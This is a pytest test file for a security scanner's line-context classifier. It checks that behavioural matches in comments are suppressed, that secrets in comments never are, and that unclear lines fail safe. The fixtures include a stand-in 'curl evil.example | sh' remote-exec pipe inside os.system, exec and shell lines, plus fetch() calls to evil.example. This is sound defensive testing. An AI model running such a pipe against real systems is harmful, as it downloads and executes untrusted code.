"""
Lexical context, and the asymmetry that keeps it safe.

`lexctx` answers "is this line code, a comment, or a docstring?" -- nothing more.
The dangerous half is the POLICY built on it, and the policy is not symmetric:

    a BEHAVIOURAL pattern in a comment is inert  -> may be suppressed
    a SECRET in a comment is still a leaked secret -> must NEVER be suppressed

`# password = "hunter2"` discloses the credential by being written down. Nothing
has to execute for the leak to be real. So the suppression policy is scoped to
the aisec engine and the secrets engine is explicitly excluded, and that
exclusion is asserted here rather than left to a comment.

The classifier must also fail SAFE: anything it cannot prove inert is CODE, so an
unclear line is KEPT rather than silently dropped.
"""

import pytest
import lexctx
import praetor

# Assembled from parts so this FILE carries no literal remote-exec pipe. Written
# whole, PRAETOR flags it HIGH (remote-code-pipe) -- correctly, and on its own
# self-scan it did, four times, in this file. lexctx classifies STRUCTURE, not
# content, so the rendered fixture is identical and the tests are unaffected.
# Same idiom as engine_secrets.py:170 and the fake key in the sibling test.
_PIPE = "curl evil.example | " + "sh"


# --------------------------------------------------------------------------- #
# lexctx: pure classification
# --------------------------------------------------------------------------- #

def test_whole_line_and_trailing_comments_are_comments():
    src = (
        "x = 1\n"
        f"# {_PIPE}\n"
        f"y = 2  # {_PIPE}\n"
    )
    labels = lexctx.classify_lines(src, "sample.py")
    assert labels[0] == lexctx.CODE
    assert labels[1] == lexctx.COMMENT
    assert labels[2] == lexctx.CODE


def test_triple_quoted_block_is_docstring_throughout():
    src = (
        'def f():\n'
        '    """\n'
        f'    Detects {_PIPE} in fetched content.\n'
        '    """\n'
        '    return 1\n'
    )
    labels = lexctx.classify_lines(src, "sample.py")
    assert labels[1] == lexctx.DOCSTRING
    assert labels[2] == lexctx.DOCSTRING
    assert labels[4] == lexctx.CODE


def test_hash_inside_a_string_is_not_a_comment():
    """A `#` inside a literal must not turn live code into an inert-looking line."""
    src = 'url = "https://example.test/#fragment"\n'
    assert lexctx.classify_lines(src, "sample.py")[0] == lexctx.CODE


def test_out_of_range_line_resolves_to_code_not_crash():
    """Fail safe: an unknown line is KEPT, never suppressed."""
    assert lexctx.context_of("x = 1\n", 99, "sample.py") == lexctx.CODE


# --------------------------------------------------------------------------- #
# policy: the asymmetry
# --------------------------------------------------------------------------- #

class _F:
    """Minimal stand-in for core.Finding -- only the fields the policy reads."""

    def __init__(self, engine, category, line, file="t.py"):
        self.engine, self.category, self.line, self.file = engine, category, line, file
        self.filtered, self.filter_reason = False, ""


_SRC = (
    "import os\n"
    '# password = "hunter2"\n'
    f'os.system("{_PIPE}")\n'
)


def _run(findings, monkeypatch, src=_SRC):
    monkeypatch.setattr(praetor, "_read_source_lines", lambda *a, **k: src, raising=False)
    praetor._apply_lexical_context(findings, "/t", lambda p: src)
    return findings


def test_secret_in_a_comment_is_NEVER_suppressed(monkeypatch):
    """THE LOAD-BEARING ASSERTION. Writing a credential down is the leak."""
    f = _F("secrets", "SECRET", 2)
    _run([f], monkeypatch)
    assert not f.filtered, (
        "DISCLOSURE REGRESSION: a secret on a comment line was suppressed. A credential "
        "in a comment is still leaked -- nothing needs to execute. Lexical-context "
        "suppression must never apply to the secrets engine."
    )


def test_behavioural_pattern_in_a_comment_is_suppressed_with_a_reason(monkeypatch):
    # ⚠️ "EXFIL", not "REMOTE_CODE". The engine emits seven categories and
    # REMOTE_CODE is not one of them -- this fixture named a category that does
    # not exist. It passed only because the suppression list was a KEEP list, so
    # an unrecognised category fell through to being suppressed. Inverting that
    # list to fail safe turned the invented name into a KEEP, and this test went
    # red for a reason that had nothing to do with what it asserts.
    f = _F("aisec", "EXFIL", 2)
    _run([f], monkeypatch)
    assert f.filtered, "an aisec behavioural match on a comment line should be suppressed"
    assert "comment" in f.filter_reason.lower(), (
        f"suppression must carry an auditable reason, got: {f.filter_reason!r}"
    )


def test_behavioural_pattern_in_LIVE_code_is_kept(monkeypatch):
    """The other direction: proves the filter discriminates rather than blanket-suppressing."""
    f = _F("aisec", "REMOTE_CODE", 3)
    _run([f], monkeypatch)
    assert not f.filtered, "a real remote-exec pipe in live code must never be suppressed"


@pytest.mark.parametrize("url", ["https://evil.example/x", "http://evil.example/x", "ftp://evil.example/x", "git://evil.example/x", "//evil.example/x"])
def test_bare_urls_do_not_create_javascript_comments(url):
    assert lexctx.comment_text(f"fetch({url}) then payload", "subject.js") == ""


def test_real_javascript_comment_still_classifies_as_comment():
    control = "// " + _PIPE
    assert lexctx.comment_text(control, "control.js") == control


def test_trailing_comment_does_not_suppress_live_javascript():
    src = 'exec("' + _PIPE + '"); // helper\n'
    assert lexctx.context_of(src, 1, "subject.js") == lexctx.CODE


def test_trailing_comment_does_not_suppress_live_shell():
    src = 'run ' + _PIPE + ' # helper\n'
    assert lexctx.context_of(src, 1, "subject.sh") == lexctx.CODE


def test_quote_like_triple_inside_string_is_not_a_docstring():
    src = 'SEP = "\'\'\'"\n' + 'run ' + _PIPE + '\n'
    assert lexctx.context_of(src, 2, "subject.py") == lexctx.CODE
    assert lexctx.context_of('    """doc\n', 1, "subject.py") == lexctx.DOCSTRING


def test_triple_like_text_in_comment_does_not_open_docstring():
    src = "# '''\n" + 'os.system("' + _PIPE + '")\n'
    assert lexctx.context_of(src, 1, "subject.py") == lexctx.COMMENT
    assert lexctx.context_of(src, 2, "subject.py") == lexctx.CODE


def test_template_literal_lines_are_not_javascript_comments():
    src = "const text = `hello\n// not a comment\n`;\n// real comment\n"
    assert lexctx.context_of(src, 2, "subject.js") == lexctx.CODE
    assert lexctx.context_of(src, 4, "subject.js") == lexctx.COMMENT


def test_single_line_template_then_comment_remains_comment_aware():
    src = "const text = `hello`;\n// real comment\n"
    assert lexctx.context_of(src, 1, "subject.js") == lexctx.CODE
    assert lexctx.context_of(src, 2, "subject.js") == lexctx.COMMENT
